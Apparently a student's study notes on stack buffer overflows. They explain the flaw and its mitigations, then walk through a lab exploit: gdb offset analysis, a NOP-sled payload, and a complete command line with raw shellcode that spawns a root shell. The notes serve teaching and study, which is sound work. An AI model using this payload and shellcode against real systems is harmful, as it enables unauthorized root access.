> [!idea]+ Buffer Overflow Vulnerabilities
>
> A buffer overflow is a security vulnerability that **occurs when a program writes more data to a buffer (array) than it can hold**, causing the excess data to overflow into adjacent memory locations.
> 
> ![[Pasted image 20240319142840.png]]
>
> Why buffer overflows are dangerous:
> - The overflowed data **can corrupt important program information** stored in memory
> - Attackers can intentionally overflow buffers to **overwrite control data like return addresses or function pointers**
> - By carefully crafting their input, **attackers can hijack program execution and run arbitrary code**
>
> **Example:** Consider an ATM program in C that prompts users to enter their name:
>
> ```c
> void getName() {
>     char name[20];
>     printf("Enter your name: ");
>     gets(name);
>     // ...
> }
> ```
>
> The `name` buffer can only hold 20 characters, but `gets()` allows writing an arbitrary length string. An attacker could input a very long name:
>
> ```
> AAAAAAAAAAAAAAAAAAAA\x10\x21\x51\x31...
> ```
>
> The `A`s overflow the buffer, and the `\x10\x21\x51\x31` bytes overwrite the return address. When `getName()` returns, execution jumps to the attacker's code instead of the intended location.
> 
> ![[Pasted image 20240319143354.png]]
>
> **Potential outcomes of buffer overflow attacks**:
> - Crashing the program (benign case)
> - Redirecting execution to an existing function (e.g. `dispenseMoney()`)
> - **Injecting and executing custom shellcode** (e.g. spawning a shell, stealing data) 
>
> **Solutions and mitigations**:
> - Use **runtime bounds checking** to validate array indices and sizes (performance overhead) (Implemented in Python, Rust, Java but not C, C++)
> - Employ secure string handling functions that limit input length
> - Enable compiler protections like stack canaries, ASLR, and DEP
> - Most importantly, write secure code that validates untrusted input 
>
> In summary, buffer overflows allow attackers to corrupt memory and hijack program control flow. Careful programming practices are essential to prevent these dangerous vulnerabilities.





> [!exercise]+ Analyzing the Stack and Identifying the Return Address
>
> To begin exploiting the buffer overflow vulnerability and injecting shellcode, we first need to analyze the stack and identify the location of the return address that we want to overwrite.
>
> Using gdb, we set a breakpoint at the end of the vulnerable `func()` function and run the program with a pattern of 128 "A"s as input. This will allow us to examine the stack and determine the offset between the start of our input and the return address.
>
> After hitting the breakpoint, we use the `x/40x $esp` command to display the stack contents:
>
> ```
> (gdb) x/40x $esp
> 0xffffd1f0: 0x41414141  0x41414141  0x41414141  0x41414141
> ...
> 0xffffd270: 0x41414141  0x41414141  0x41414141  0x41414141
> 0xffffd280: 0xf7fad620  0x00000000  0xffffd2b8  0x080491b1
> ...
> ```
>
> Here, we can see the buffer filled with our "A"s (0x41 in hex) starting at address `0xffffd1f0`.
>
> Next, we use the `info frame` command to find the location of the saved return address:
>
> ```
> (gdb) info frame
> Stack level 0, frame at 0xffffd280:
>  eip = 0x401152 in func (simple.c:7); saved eip = 0x8049d21
>  ...
>  Saved registers:
>   ebp at 0xffffd278, eip at 0xffffd27c
> ```
>
> The output reveals that the saved return address is located at `0xffffd27c` and we need to overwrite `0x8049d21`
>
> With this information, we can calculate the exact offset between the start of our buffer and the return address:
>
> ```
> 0xffffd27c - 0xffffd1f0 = 140 bytes
> ```
>
> This means we need to send a payload of 140 bytes, where the last 4 bytes will overwrite the return address.

> [!exercise]+ Constructing the Malicious Payload
>
> Now that we know the offset to the return address, we can construct our malicious payload to inject shellcode and control the program's execution flow.
>
> The payload will consist of the following components:
>
> 1. [[NOP]] sled (landing pad): A sequence of NOP instructions (`\x90`) that acts as a safety net for our shellcode. It provides a large area of harmless instructions, increasing the chances of our shellcode being executed successfully even if the return address is slightly off.
>
> 2. Shellcode: The actual malicious code that we want to execute. In this example, we'll use a 34-byte shellcode that spawns a shell with root privileges.
>
> 3. Filler: Additional padding to ensure our payload reaches the desired length of 140 bytes.
>
> 4. Return address: The address we want to overwrite the saved return address with. It should point somewhere within our NOP sled.
>
> Here's how we construct the payload:
>
> ```python
> payload = "\x90"*80 + shellcode + "A"*26 + "\xfc\xd1\xff\xff"
> ```
>
> - We start with 80 bytes of NOP sled (`\x90`).
> - We append our 34-byte shellcode.
> - We add 26 bytes of filler (in this case, "A"s) to pad the payload to the desired length.
> - Finally, we include the return address (`\xfc\xd1\xff\xff`) in little-endian format, which points to somewhere within our NOP sled.
>
> The total length of our payload is 80 + 34 + 26 + 4 = 144 bytes, which matches the offset we calculated earlier (140 bytes) plus the size of the return address itself (4 bytes).

> [!exercise]+ Executing the Exploit and Gaining Root Access
>
> With our malicious payload constructed, we can now execute the exploit and gain unauthorized root access to the system.
>
> We run the vulnerable program with our payload as the command-line argument:
>
> ```
> /home/a1112407/ws5/simple $(python -c 'print "\x90"*80 +"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "A"*26 + "\xfc\xd1\xff\xff"')
> ```
>
> Here's what happens when the exploit is executed:
>
> 1. The program copies our payload into the vulnerable buffer using `strcpy()`.
>
> 2. The NOP sled, shellcode, and filler are written to the stack, overflowing the buffer.
>
> 3. The return address is overwritten with the address we specified (`\xfc\xd1\xff\xff`), which points somewhere within our NOP sled.
>
> 4. When the `func()` function returns, instead of returning to the original caller, it jumps to the address we specified in the NOP sled.
>
> 5. The execution continues through the NOP sled until it reaches our shellcode.
>
> 6. The shellcode is executed, spawning a shell with root privileges.
>
> We can confirm that we have successfully gained root access by running the `whoami` command in the spawned shell:
>
> ```
> # whoami
> root
> ```
>
> This demonstrates the power of exploiting buffer overflow vulnerabilities to inject shellcode and gain unauthorized control over a system.
